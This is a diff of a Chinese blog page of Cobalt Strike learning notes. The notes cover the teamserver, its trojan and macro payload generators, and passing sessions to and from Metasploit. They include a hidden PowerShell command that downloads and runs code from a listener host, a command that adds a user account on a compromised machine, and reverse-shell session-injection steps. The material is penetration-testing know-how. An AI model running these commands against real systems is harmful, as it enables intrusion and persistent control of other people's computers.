@@ -1,17 +1,20 @@
+
+
 <!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具。 　 0x01 安装与运行Java环境，服务端运行在Linux系统上。 sudo ./teamserver 172.28.100.188 root         0x02 参数详情 View =&amp;gt; Credentials通过hashdump或者Mimikatz抓取过的密码都会储存在这里。Web lo">
+<html lang="">
+<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.8.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+    <meta name="description" content="">
+    <title>Cobalt Strike学习笔记 | c1y2m3’blog</title>
+
+    <!-- Open Graph -->
+    <meta name="description" content="&amp;#x3000;Cobalt Strike &amp;#x4E00;&amp;#x6B3E;&amp;#x4EE5;metasploit&amp;#x4E3A;&amp;#x57FA;&amp;#x7840;&amp;#x7684;GUI&amp;#x7684;&amp;#x6846;&amp;#x67B6;&amp;#x5F0F;&amp;#x6E17;&amp;#x900F;&amp;#x6D4B;&amp;#x8BD5;&amp;#x5DE5;&amp;#x5177;&amp;#x3002; &amp;#x3000; 0x01 &amp;#x5B8">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Cobalt Strike学习笔记">
 <meta property="og:url" content="http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/index.html">
 <meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具。 　 0x01 安装与运行Java环境，服务端运行在Linux系统上。 sudo ./teamserver 172.28.100.188 root         0x02 参数详情 View =&amp;gt; Credentials通过hashdump或者Mimikatz抓取过的密码都会储存在这里。Web lo">
+<meta property="og:description" content="&amp;#x3000;Cobalt Strike &amp;#x4E00;&amp;#x6B3E;&amp;#x4EE5;metasploit&amp;#x4E3A;&amp;#x57FA;&amp;#x7840;&amp;#x7684;GUI&amp;#x7684;&amp;#x6846;&amp;#x67B6;&amp;#x5F0F;&amp;#x6E17;&amp;#x900F;&amp;#x6D4B;&amp;#x8BD5;&amp;#x5DE5;&amp;#x5177;&amp;#x3002; &amp;#x3000; 0x01 &amp;#x5B8">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5baef5caea3b4a262af7be9b">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5baef62fea3b4a262af7cbca">
@@ -22,166 +25,166 @@
 <meta property="og:updated_time" content="2018-11-18T16:44:24.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Cobalt Strike学习笔记">
-<meta name="twitter:description" content="Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具。 　 0x01 安装与运行Java环境，服务端运行在Linux系统上。 sudo ./teamserver 172.28.100.188 root         0x02 参数详情 View =&amp;gt; Credentials通过hashdump或者Mimikatz抓取过的密码都会储存在这里。Web lo">
+<meta name="twitter:description" content="&amp;#x3000;Cobalt Strike &amp;#x4E00;&amp;#x6B3E;&amp;#x4EE5;metasploit&amp;#x4E3A;&amp;#x57FA;&amp;#x7840;&amp;#x7684;GUI&amp;#x7684;&amp;#x6846;&amp;#x67B6;&amp;#x5F0F;&amp;#x6E17;&amp;#x900F;&amp;#x6D4B;&amp;#x8BD5;&amp;#x5DE5;&amp;#x5177;&amp;#x3002; &amp;#x3000; 0x01 &amp;#x5B8">
 <meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5baef5caea3b4a262af7be9b">
+
+    <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Person",
+  "email": "mailto:",
+  "image": "",
+  "name": "John Doe",
+  "url": "http://yoursite.com"
+}
+</script>
+    <script>
+    var algoliaEnabled = false;
+    
+</script>
+
+    
+
     
     
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+    
+    
+    
+        <!-- stylesheets list from config.yml -->
         
-          
-              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
-          
+        <link rel="stylesheet" href="/c1y2m3.github.io/css/aloha.css">
         
+        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
         
-          
-            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
-          
+        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
         
     
-    <!-- title -->
-    <title>Cobalt Strike学习笔记</title>
-    <!-- styles -->
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
-    <!-- persian styles -->
-    
-      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
-    
-    <!-- rss -->
-    
-    
+
 </head>
+<body id="body" style="margin-bottom: 0;" class="pushable">
 
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </span>
-    <br>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/c1y2m3.github.io/2018/10/07/关于前期信息收集笔记/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/c1y2m3.github.io/2018/09/26/ redis安全详解/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/&text=Cobalt Strike学习笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/&title=Cobalt Strike学习笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/&is_video=false&description=Cobalt Strike学习笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Cobalt Strike学习笔记&body=Check out this article: http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/&title=Cobalt Strike学习笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/&title=Cobalt Strike学习笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/&title=Cobalt Strike学习笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/&title=Cobalt Strike学习笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/09/29/ Cobalt Strike学习笔记/&name=Cobalt Strike学习笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-</ul>
-
+    <div class="ui top fixed menu">
+        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
     </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-安装与运行"><span class="toc-number">1.</span> <span class="toc-text">0x01 安装与运行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-参数详情"><span class="toc-number">2.</span> <span class="toc-text">0x02 参数详情</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-基本运行"><span class="toc-number">3.</span> <span class="toc-text">0x03 基本运行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#word宏-CHM制作-LNK-水坑攻击-待续！"><span class="toc-number">4.</span> <span class="toc-text">word宏 CHM制作 LNK 水坑攻击 待续！</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#右键-进入-Interact-进入交互模式"><span class="toc-number">5.</span> <span class="toc-text">右键 进入 Interact 进入交互模式</span></a></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-与msf进行联动"><span class="toc-number"></span> <span class="toc-text">0x04 与msf进行联动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x05-与cs进行联动"><span class="toc-number">1.</span> <span class="toc-text">0x05 与cs进行联动</span></a></li></ol>
-    </li></div>
-  </span>
+
+    <div id="menu-sidebar" class="ui left vertical sidebar menu">
+
+    <div id="sidebar-top">
+        <div class="content">
+            <h3>c1y2m3’blog</h3>
+        </div>
+    </div>
+    <div class="ui container sidebar-card">
+    <div class="ui people shape content">
+        <div class="active side">
+            <div class="ui card">
+                <div class="image">
+                    <img class="ui medium bordered image" src="/c1y2m3.github.io/images/avatar.jpg">
+                </div>
+                <div class="content">
+                    <a class="header">John Doe</a>
+                    
+                </div>
+                <div class="extra content">
+                    <div class="ui list">
+                        
+                        
+                    </div>
+
+                </div>
+                <div class="extra content">
+                    <div class="ui list">
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
 </div>
 
     
-    <div class="content index py4">
-        
-        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-  <header>
     
-    <h1 class="posttitle" itemprop="name headline">
-        Cobalt Strike学习笔记
-    </h1>
+
+    
+
+    
+    <a href="/index.html" class="item">
+        <i class="home icon"></i>
+        HOME
+    </a>
+
+    
+
+    
+</div>
+
+    <div class="pusher body-content">
+        <div id="content" class="ui main container">
+            <!--<div class="ui one column grid">-->
+                <!--<div class="column">-->
+                    <!--<div class="ui main container">-->
+                        <div id="post- Cobalt Strike学习笔记" class="ui main container article-type-post">
+
+    
+
+    <div class="ui divided grid">
+
+        <div class="two column row" id="article-content">
+
+            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
+                
+
+<h1 class="ui header">
+    
+    Cobalt Strike学习笔记
+</h1>
 
 
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-        <span itemprop="name">c1y2m3’blog</span>
-      </span>
-      
-    <div class="postdate">
-        <time datetime="2018-09-28T16:34:14.000Z" itemprop="datePublished">2018-09-29</time>
-    </div>
+                <div class="article-inner">
 
-
-      
-
-      
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <p>　Cobalt Strike 一款以metasploit为基础的GUI的框架式渗透测试工具。
-　</p>
-<h5 id="0x01-安装与运行"><a href="#0x01-安装与运行" class="headerlink" title="0x01 安装与运行"></a>0x01 安装与运行</h5><p>Java环境，服务端运行在Linux系统上。</p>
+                    <div class="article-entry" itemprop="articleBody">
+                        
+                        <p>&#x3000;Cobalt Strike &#x4E00;&#x6B3E;&#x4EE5;metasploit&#x4E3A;&#x57FA;&#x7840;&#x7684;GUI&#x7684;&#x6846;&#x67B6;&#x5F0F;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#x3002;
+&#x3000;</p>
+<h5 id="0x01-&#x5B89;&#x88C5;&#x4E0E;&#x8FD0;&#x884C;"><a href="#0x01-&#x5B89;&#x88C5;&#x4E0E;&#x8FD0;&#x884C;" class="headerlink" title="0x01 &#x5B89;&#x88C5;&#x4E0E;&#x8FD0;&#x884C;"></a>0x01 &#x5B89;&#x88C5;&#x4E0E;&#x8FD0;&#x884C;</h5><p>Java&#x73AF;&#x5883;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x8FD0;&#x884C;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E0A;&#x3002;</p>
 <p><code>sudo ./teamserver 172.28.100.188 root</code></p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baef5caea3b4a262af7be9b" alt=""></p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baef62fea3b4a262af7cbca" alt=""></p>
-<ul>
+<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5baef5caea3b4a262af7be9b"><img src="https://www.yunzhijia.com/microblog/filesvr/5baef5caea3b4a262af7be9b" alt="" class="ui centered image"></a></p>
+<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5baef62fea3b4a262af7cbca"><img src="https://www.yunzhijia.com/microblog/filesvr/5baef62fea3b4a262af7cbca" alt="" class="ui centered image"></a></p>
+<ul class="ui list">
 <li><ul>
 <li></li>
 </ul>
 </li>
 </ul>
-<h5 id="0x02-参数详情"><a href="#0x02-参数详情" class="headerlink" title="0x02 参数详情"></a>0x02 参数详情</h5><ol>
-<li><code>View =&gt; Credentials</code><br>通过hashdump或者Mimikatz抓取过的密码都会储存在这里。<br><code>Web log =&gt; #显示web访问记录</code></li>
-<li>Packages  #攻击包<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTML Application   生成恶意的HTA木马文件</span><br><span class="line">MS Office Macro   生成office宏病毒文件</span><br><span class="line">Payload Generator   生成各种语言版本的payload</span><br><span class="line">USB/CD AutoPlay   生成利用自动播放运行的木马文件</span><br><span class="line">Windows Dropper   捆绑器，能够对文档类进行捆绑</span><br><span class="line">Windows Executable   生成可执行exe木马</span><br><span class="line">Windows Executable(S)  生成无状态的可执行exe木马</span><br></pre></td></tr></table></figure>
+<h5 id="0x02-&#x53C2;&#x6570;&#x8BE6;&#x60C5;"><a href="#0x02-&#x53C2;&#x6570;&#x8BE6;&#x60C5;" class="headerlink" title="0x02 &#x53C2;&#x6570;&#x8BE6;&#x60C5;"></a>0x02 &#x53C2;&#x6570;&#x8BE6;&#x60C5;</h5><ol class="ui list">
+<li><code>View =&gt; Credentials</code><br>&#x901A;&#x8FC7;hashdump&#x6216;&#x8005;Mimikatz&#x6293;&#x53D6;&#x8FC7;&#x7684;&#x5BC6;&#x7801;&#x90FD;&#x4F1A;&#x50A8;&#x5B58;&#x5728;&#x8FD9;&#x91CC;&#x3002;<br><code>Web log =&gt; #&#x663E;&#x793A;web&#x8BBF;&#x95EE;&#x8BB0;&#x5F55;</code></li>
+<li>Packages  #&#x653B;&#x51FB;&#x5305;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTML Application   &#x751F;&#x6210;&#x6076;&#x610F;&#x7684;HTA&#x6728;&#x9A6C;&#x6587;&#x4EF6;</span><br><span class="line">MS Office Macro   &#x751F;&#x6210;office&#x5B8F;&#x75C5;&#x6BD2;&#x6587;&#x4EF6;</span><br><span class="line">Payload Generator   &#x751F;&#x6210;&#x5404;&#x79CD;&#x8BED;&#x8A00;&#x7248;&#x672C;&#x7684;payload</span><br><span class="line">USB/CD AutoPlay   &#x751F;&#x6210;&#x5229;&#x7528;&#x81EA;&#x52A8;&#x64AD;&#x653E;&#x8FD0;&#x884C;&#x7684;&#x6728;&#x9A6C;&#x6587;&#x4EF6;</span><br><span class="line">Windows Dropper   &#x6346;&#x7ED1;&#x5668;&#xFF0C;&#x80FD;&#x591F;&#x5BF9;&#x6587;&#x6863;&#x7C7B;&#x8FDB;&#x884C;&#x6346;&#x7ED1;</span><br><span class="line">Windows Executable   &#x751F;&#x6210;&#x53EF;&#x6267;&#x884C;exe&#x6728;&#x9A6C;</span><br><span class="line">Windows Executable(S)  &#x751F;&#x6210;&#x65E0;&#x72B6;&#x6001;&#x7684;&#x53EF;&#x6267;&#x884C;exe&#x6728;&#x9A6C;</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
-<ul>
+<ul class="ui list">
 <li><ul>
 <li></li>
 </ul>
 </li>
 </ul>
-<h5 id="0x03-基本运行"><a href="#0x03-基本运行" class="headerlink" title="0x03 基本运行"></a>0x03 基本运行</h5><p>首先创建一个Listener，点击cobalt strike -&gt;Listeners -&gt; Add</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baefa1550f8dd17df72d58e" alt=""></p>
-<p><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://172.28.100.188:81/a&#39;))&quot;</code></p>
-<h5 id="word宏-CHM制作-LNK-水坑攻击-待续！"><a href="#word宏-CHM制作-LNK-水坑攻击-待续！" class="headerlink" title="word宏 CHM制作 LNK 水坑攻击 待续！"></a>word宏 CHM制作 LNK 水坑攻击 待续！</h5><ul>
+<h5 id="0x03-&#x57FA;&#x672C;&#x8FD0;&#x884C;"><a href="#0x03-&#x57FA;&#x672C;&#x8FD0;&#x884C;" class="headerlink" title="0x03 &#x57FA;&#x672C;&#x8FD0;&#x884C;"></a>0x03 &#x57FA;&#x672C;&#x8FD0;&#x884C;</h5><p>&#x9996;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;Listener&#xFF0C;&#x70B9;&#x51FB;cobalt strike -&gt;Listeners -&gt; Add</p>
+<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5baefa1550f8dd17df72d58e"><img src="https://www.yunzhijia.com/microblog/filesvr/5baefa1550f8dd17df72d58e" alt="" class="ui centered image"></a></p>
+<p><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://172.28.100.188:81/a&apos;))&quot;</code></p>
+<h5 id="word&#x5B8F;-CHM&#x5236;&#x4F5C;-LNK-&#x6C34;&#x5751;&#x653B;&#x51FB;-&#x5F85;&#x7EED;&#xFF01;"><a href="#word&#x5B8F;-CHM&#x5236;&#x4F5C;-LNK-&#x6C34;&#x5751;&#x653B;&#x51FB;-&#x5F85;&#x7EED;&#xFF01;" class="headerlink" title="word&#x5B8F; CHM&#x5236;&#x4F5C; LNK &#x6C34;&#x5751;&#x653B;&#x51FB; &#x5F85;&#x7EED;&#xFF01;"></a>word&#x5B8F; CHM&#x5236;&#x4F5C; LNK &#x6C34;&#x5751;&#x653B;&#x51FB; &#x5F85;&#x7EED;&#xFF01;</h5><ul class="ui list">
 <li><ul>
 <li></li>
 </ul>
 </li>
 </ul>
-<h5 id="右键-进入-Interact-进入交互模式"><a href="#右键-进入-Interact-进入交互模式" class="headerlink" title="右键 进入 Interact 进入交互模式"></a>右键 进入 Interact 进入交互模式</h5><p><img src="https://www.yunzhijia.com/microblog/filesvr/5baf105ddb5aa66c49adbcba" alt=""></p>
-<p><code>详情输入 Help</code> shell net user test test /add</p>
-<ul>
+<h5 id="&#x53F3;&#x952E;-&#x8FDB;&#x5165;-Interact-&#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;"><a href="#&#x53F3;&#x952E;-&#x8FDB;&#x5165;-Interact-&#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;" class="headerlink" title="&#x53F3;&#x952E; &#x8FDB;&#x5165; Interact &#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;"></a>&#x53F3;&#x952E; &#x8FDB;&#x5165; Interact &#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;</h5><p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5baf105ddb5aa66c49adbcba"><img src="https://www.yunzhijia.com/microblog/filesvr/5baf105ddb5aa66c49adbcba" alt="" class="ui centered image"></a></p>
+<p><code>&#x8BE6;&#x60C5;&#x8F93;&#x5165; Help</code> shell net user test test /add</p>
+<ul class="ui list">
 <li><ul>
-<li><h3 id="0x04-与msf进行联动"><a href="#0x04-与msf进行联动" class="headerlink" title="0x04 与msf进行联动"></a>0x04 与msf进行联动</h3>权限维持：<br>当cs获取到一个上线机器，把这个机器丢给msf中meterpreter获取session</li>
+<li><h3 id="0x04-&#x4E0E;msf&#x8FDB;&#x884C;&#x8054;&#x52A8;"><a href="#0x04-&#x4E0E;msf&#x8FDB;&#x884C;&#x8054;&#x52A8;" class="headerlink" title="0x04 &#x4E0E;msf&#x8FDB;&#x884C;&#x8054;&#x52A8;"></a>0x04 &#x4E0E;msf&#x8FDB;&#x884C;&#x8054;&#x52A8;</h3>&#x6743;&#x9650;&#x7EF4;&#x6301;&#xFF1A;<br>&#x5F53;cs&#x83B7;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x4E0A;&#x7EBF;&#x673A;&#x5668;&#xFF0C;&#x628A;&#x8FD9;&#x4E2A;&#x673A;&#x5668;&#x4E22;&#x7ED9;msf&#x4E2D;meterpreter&#x83B7;&#x53D6;session</li>
 </ul>
 </li>
 </ul>
@@ -194,129 +197,139 @@
 <p><code>msf exploit(handler) &gt; set lport 5555</code></p>
 <p><code>lport =&gt; 5555</code></p>
 <p><code>msf exploit(handler) &gt; exploit -j</code></p>
-<ul>
+<ul class="ui list">
 <li><ul>
 <li></li>
 </ul>
 </li>
 </ul>
-<p>之后Cobalt strike 创建一个windows/foreign/reverse_tcp Listener，其中ip为msf的ip地址，端口为msf监听的端口。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baeff52db5aa66c49ac9f40" alt=""></p>
-<p>然后选中计算机，右键-&gt;Spawn:选择刚刚创建的监听器：<br>可以看到目标主机的已上线，我们可以进行我们的操作了。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5baf020bea3b4a262af8e6cf" alt=""></p>
-<ul>
+<p>&#x4E4B;&#x540E;Cobalt strike &#x521B;&#x5EFA;&#x4E00;&#x4E2A;windows/foreign/reverse_tcp Listener&#xFF0C;&#x5176;&#x4E2D;ip&#x4E3A;msf&#x7684;ip&#x5730;&#x5740;&#xFF0C;&#x7AEF;&#x53E3;&#x4E3A;msf&#x76D1;&#x542C;&#x7684;&#x7AEF;&#x53E3;&#x3002;</p>
+<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5baeff52db5aa66c49ac9f40"><img src="https://www.yunzhijia.com/microblog/filesvr/5baeff52db5aa66c49ac9f40" alt="" class="ui centered image"></a></p>
+<p>&#x7136;&#x540E;&#x9009;&#x4E2D;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x53F3;&#x952E;-&gt;Spawn:&#x9009;&#x62E9;&#x521A;&#x521A;&#x521B;&#x5EFA;&#x7684;&#x76D1;&#x542C;&#x5668;&#xFF1A;<br>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;&#x5DF2;&#x4E0A;&#x7EBF;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x6211;&#x4EEC;&#x7684;&#x64CD;&#x4F5C;&#x4E86;&#x3002;</p>
+<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5baf020bea3b4a262af8e6cf"><img src="https://www.yunzhijia.com/microblog/filesvr/5baf020bea3b4a262af8e6cf" alt="" class="ui centered image"></a></p>
+<ul class="ui list">
 <li><ul>
 <li></li>
 </ul>
 </li>
 </ul>
-<h5 id="0x05-与cs进行联动"><a href="#0x05-与cs进行联动" class="headerlink" title="0x05 与cs进行联动"></a>0x05 与cs进行联动</h5><p>msf获得了一个meterpreter的session，想把session传给cs<br>在cs创建一个监听，host修改成cs客户端IP，监听6666端口。</p>
-<p>此时切我们换到meterpreter中，</p>
-<p><code>meterpreter &gt; background # 切换到后台</code></p>
+<h5 id="0x05-&#x4E0E;cs&#x8FDB;&#x884C;&#x8054;&#x52A8;"><a href="#0x05-&#x4E0E;cs&#x8FDB;&#x884C;&#x8054;&#x52A8;" class="headerlink" title="0x05 &#x4E0E;cs&#x8FDB;&#x884C;&#x8054;&#x52A8;"></a>0x05 &#x4E0E;cs&#x8FDB;&#x884C;&#x8054;&#x52A8;</h5><p>msf&#x83B7;&#x5F97;&#x4E86;&#x4E00;&#x4E2A;meterpreter&#x7684;session&#xFF0C;&#x60F3;&#x628A;session&#x4F20;&#x7ED9;cs<br>&#x5728;cs&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x76D1;&#x542C;&#xFF0C;host&#x4FEE;&#x6539;&#x6210;cs&#x5BA2;&#x6237;&#x7AEF;IP&#xFF0C;&#x76D1;&#x542C;6666&#x7AEF;&#x53E3;&#x3002;</p>
+<p>&#x6B64;&#x65F6;&#x5207;&#x6211;&#x4EEC;&#x6362;&#x5230;meterpreter&#x4E2D;&#xFF0C;</p>
+<p><code>meterpreter &gt; background # &#x5207;&#x6362;&#x5230;&#x540E;&#x53F0;</code></p>
 <p><code>msf exploit(handler) &gt; use</code></p>
 <p><code>exploit/windows/local/payload_inject</code></p>
-<p><code>这个exploit是注入一个新的payload 到当前的session里面</code></p>
+<p><code>&#x8FD9;&#x4E2A;exploit&#x662F;&#x6CE8;&#x5165;&#x4E00;&#x4E2A;&#x65B0;&#x7684;payload &#x5230;&#x5F53;&#x524D;&#x7684;session&#x91CC;&#x9762;</code></p>
 <p><code>msf exploit(payload_inject) &gt; set payload</code></p>
-<p><code>windows/meterpreter/reverse_http # 不能使用x64的payload</code></p>
-<p><code>msf exploit(payload_inject) &gt; set DisablePayloadHandler true</code><br><code>关闭msf payload的监听，可以不用设置，不影响效果</code></p>
+<p><code>windows/meterpreter/reverse_http # &#x4E0D;&#x80FD;&#x4F7F;&#x7528;x64&#x7684;payload</code></p>
+<p><code>msf exploit(payload_inject) &gt; set DisablePayloadHandler true</code><br><code>&#x5173;&#x95ED;msf payload&#x7684;&#x76D1;&#x542C;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x7528;&#x8BBE;&#x7F6E;&#xFF0C;&#x4E0D;&#x5F71;&#x54CD;&#x6548;&#x679C;</code></p>
 <p><code>msf exploit(payload_inject) &gt; set lhost 192.168.3.103</code></p>
-<p><code>msf exploit(payload_inject) &gt; set lport 6666 # 监听者的监听端口</code></p>
+<p><code>msf exploit(payload_inject) &gt; set lport 6666 # &#x76D1;&#x542C;&#x8005;&#x7684;&#x76D1;&#x542C;&#x7AEF;&#x53E3;</code></p>
 <p><code>msf exploit(payload_inject) &gt; set session 1</code></p>
 <p><code>msf exploit(payload_inject) &gt; exploit</code></p>
-<p>根据上线的肉鸡，可以使用SOCKS代理</p>
+<p>&#x6839;&#x636E;&#x4E0A;&#x7EBF;&#x7684;&#x8089;&#x9E21;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;SOCKS&#x4EE3;&#x7406;</p>
 
-  </div>
-</article>
+                        
+                    </div>
 
+                    
+                    
+                    
 
+                    <div class="description post-description">
+    <span class="post-description-item">
+        <time datetime="2018-09-28T16:34:14.000Z" itemprop="datePublished">2018-09-29</time>
 
+    </span>
+    <span class="post-description-item">
         
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
